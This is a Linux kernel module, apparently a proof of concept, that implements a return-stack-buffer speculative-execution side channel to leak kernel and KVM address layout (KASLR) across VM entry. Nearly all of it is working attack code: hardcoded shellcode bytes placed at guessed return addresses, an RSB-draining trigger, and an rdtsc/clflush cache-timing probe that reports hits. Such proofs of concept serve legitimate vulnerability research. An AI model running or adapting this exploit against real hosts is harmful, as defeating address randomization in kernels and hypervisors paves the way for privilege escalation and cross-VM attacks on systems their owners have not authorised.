#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/io.h>
#include <linux/vmalloc.h>
#include <asm/fixmap.h>
#include <asm/page.h>
#include <asm/set_memory.h>

// The page offset is fixed and the rest of the address can be bruteforced with a binary search approach
// For this poc, we get the address from /proc/kallsyms


// svm_vcpu_enter_exit + 0x73 in kvm-amd.ko (call to _svm_vcpu_run)
static const u64 call_offset0 = 0x73;
static const u64 cheat0 = 0xffffffffc1cf3280UL + call_offset0;

// kvm_arch_vcpu_ioctl_run + 0x822 in kvm.ko (call to vcpu_run)
static const u64 call_offset1 = 0x822;
static const u64 cheat1 = 0xffffffffc1de3a00UL + call_offset1;

// __x64_sys_ioctl +0x94 in the kernel (call to __x86_indirect_thunk_rax)
static const u64 call_offset2 = 0x94;
static const u64 cheat2 = 0xffffffff922826f0UL + call_offset2;



static const u64 page0 = cheat0 & ~0xfffUL;
static const u64 ret_page_offset0 = cheat0 & 0xfffUL;

static const u64 page1 = cheat1 & ~0xfffUL;
static const u64 ret_page_offset1 = cheat1 & 0xfffUL;

static const u64 page2 = cheat2 & ~0xfffUL;
static const u64 ret_page_offset2 = cheat2 & 0xfffUL;


static const u64 cheats[] = {cheat0, cheat1, cheat2};
static const u64 pages[] = {page0, page1, page2};
static const u64 ret_page_offsets[] = {ret_page_offset0, ret_page_offset1, ret_page_offset2};

#define N_TARGETS (sizeof(pages) / sizeof(u64))

static const char* const target0 = (const char*)0xffffffff00000000UL;
static const char* const target1 = (const char*)0xffffffff02000000UL;
static const char* const target2 = (const char*)0xffffffff04000000UL;
static const char* const target3 = (const char*)0xffffffff06000000UL;
static const char* const target4 = (const char*)0xffffffff08000000UL;

static const char* targets[] = {target0, target1, target2, target3, target4};

static volatile char foo;

// mov rax, 0xffffffff00000000; mov al, [rax]; mfence; ret;
static const u8 shellcode0[] = {0x48, 0xb8, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x8a, 0x0, 0x0f, 0xae, 0xf0, 0xc3};
// mov rax, 0xffffffff02000000; mov al, [rax]; mfence; ret;
static const u8 shellcode1[] = {0x48, 0xb8, 0x0, 0x0, 0x0, 0x2, 0xff, 0xff, 0xff, 0xff, 0x8a, 0x0, 0x0f, 0xae, 0xf0, 0xc3};
// mov rax, 0xffffffff04000000; mov al, [rax]; mfence; ret;
static const u8 shellcode2[] = {0x48, 0xb8, 0x0, 0x0, 0x0, 0x4, 0xff, 0xff, 0xff, 0xff, 0x8a, 0x0, 0x0f, 0xae, 0xf0, 0xc3};
// mov rax, 0xffffffff06000000; mov al, [rax]; mfence; ret;
static const u8 shellcode3[] = {0x48, 0xb8, 0x0, 0x0, 0x0, 0x6, 0xff, 0xff, 0xff, 0xff, 0x8a, 0x0, 0x0f, 0xae, 0xf0, 0xc3};
// mov rax, 0xffffffff08000000; mov al, [rax]; mfence; ret;
static const u8 shellcode4[] = {0x48, 0xb8, 0x0, 0x0, 0x0, 0x8, 0xff, 0xff, 0xff, 0xff, 0x8a, 0x0, 0x0f, 0xae, 0xf0, 0xc3};

static const u8* shellcodes[] = {shellcode0, shellcode1, shellcode2, shellcode3, shellcode4};



extern void drain_rsb(void);  // Assembly attack

#define _mm_mfence() asm volatile("mfence; nop;":::"memory")
#define _mm_clflush(addr) asm volatile("clflush %0" : "+m" (*(volatile char *)(addr)))
#define __rdtsc() ({ \
	u32 lo, hi; \
	asm volatile("rdtsc" : "=a"(lo), "=d"(hi)); \
	((u64)hi << 32) | lo; \
})


static u64 cache_miss_threshold;
static volatile char pad1[0x100];
static char cache_time_target_addr;
static volatile char pad2[0x100];

__attribute__((optimize("O0"))) static void calculate_cache_miss_threshold(void)
{
	u64 t1, t2, t;
	u64 min_cache_miss_time;

	cache_time_target_addr = 0;  // Ensure page fault
	min_cache_miss_time = 1 << 20;

	pr_info("Calculating cache miss threshold\n");
	for (size_t i = 0; i < 0x100000; i++) {
		_mm_clflush(&cache_time_target_addr);
			
		_mm_mfence();
		t1 = __rdtsc();
		_mm_mfence();

		foo &= cache_time_target_addr;

		_mm_mfence();
		t2 = __rdtsc();
		_mm_mfence();

		t = t2 - t1;
		if (t < min_cache_miss_time) {
			min_cache_miss_time = t;
		}
	}

	cache_miss_threshold = min_cache_miss_time - 10;

	pr_info("Got cache miss threshold: %llu\n", cache_miss_threshold);
}


// Map target memory at fixed virtual address to be accessed by speculative shellcode
static void map_target_addresses(void)
{
	phys_addr_t phys;
	void* p;

	pr_info("Mapping target addresses\n");

	for (size_t i = 0; i < N_TARGETS; i++) {
		p = (char*)__get_free_page(GFP_KERNEL);
		if (!p) {
			pr_err("Unable to allocate page\n");
			BUG();
		}
		phys = virt_to_phys(p);

		set_fixmap(__virt_to_fix((u64)targets[i]), phys);
		// Fill with random to avoid possible optimizations
		*(u64*)targets[i] = 0x0123456789abcdef + i;
	}
}

// Map shellcodes at guessed addresses and set them r-x
static void setup_shellcodes(void)
{
	phys_addr_t phys;
	void* p;

	int ret;

	pr_info("Setup shellcodes\n");

	for (size_t i = 0; i < N_TARGETS; i++) {
		p = (char*)__get_free_page(GFP_KERNEL);
		if (!p) {
			pr_err("Unable to allocate page\n");
			BUG();
		}

		memset(p, 0xcc, PAGE_SIZE);  // Fill with int3 to avoid false positives
		memcpy(p + ret_page_offsets[i], shellcodes[i], sizeof(shellcode0));

		phys = virt_to_phys(p);

		set_fixmap(__virt_to_fix(pages[i]), phys);
		foo &= *(u64*)pages[i];  // Trigger page fault? Probably useless since it already has its physical page

		ret = set_memory_ro(pages[i], 1);
		if (ret) goto map_shellcode_error;
		ret = set_memory_x(pages[i], 1);
		if (ret) goto map_shellcode_error;

		continue;

	map_shellcode_error:
		pr_err("Failed to mark memory executable (error %d)\n", ret);
		BUG();
	}
}

__attribute__((optimize("O0"))) static bool check_cache_hit(const char* const address, u64 attempt, size_t gadget_ind)
{
	u64 t1, t2, t;
	_mm_mfence();
	t1 = __rdtsc();
	_mm_mfence();

	foo = *address;

	_mm_mfence();
	t2 = __rdtsc();
	_mm_mfence();

	t = t2 - t1;
	if (t < cache_miss_threshold) {
		pr_info("Hit gadget %zu, cache hit time %llu at attempt %llu\n", gadget_ind, t, attempt);
		return true;
	}
	return false;
}


__attribute__((optimize("O0"))) static void attack(bool* already_got)
{
	u64 cnt;
	bool still_any;

	pr_info("Starting attack\n");

	cnt = 0;

	while (cnt < 10000) {
		for (size_t i = 0; i < N_TARGETS; i++) {
			((void(*)(void))(cheats[i]))();  // Put gadgets in L1i cache
		}

		for (size_t i = 0; i < N_TARGETS; i++) {
			_mm_clflush(targets[i]);
		}
		drain_rsb();  // Trigger speculative shellcode if correct guess
		
		for (size_t i = 0; i < N_TARGETS; i++) {
			if (already_got[i]) continue;
			if (check_cache_hit(targets[i], cnt, i)) {
				already_got[i] = true;
				break;
			}
			if (++cnt % 50000 == 0) {
				pr_info("Attempt %llu\n", cnt);
			}
		}
		still_any = false;
		for (size_t i = 0; i < N_TARGETS; i++) {
			still_any |= !already_got[i];
		}
		if (!still_any) { break; }
	}
}

static int __init my_module_init(void)
{
	bool already_got[N_TARGETS] = {false};


	pr_info("Init module\n");

	calculate_cache_miss_threshold();
	map_target_addresses();
	setup_shellcodes();

	pr_info("Entering critical section\n");
	asm("cli");

	attack(already_got);

	pr_info("Exiting critical section\n");
	asm("sti");

	pr_info("\n\n\nFinal results:\n");
	for (size_t i = 0; i < N_TARGETS; i++) {
		if (already_got[i]) {
			pr_info("Target %zu: HIT\n", i);
		} else {
			pr_info("Target %zu: MISS\n", i);
		}
	}

	return 0;
}

static void __exit my_module_exit(void)
{
	// Remove everything (just restart the vm)
}

module_init(my_module_init);
module_exit(my_module_exit);

MODULE_AUTHOR("Chino");
MODULE_DESCRIPTION("rsb vmenter kaslr leak");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");
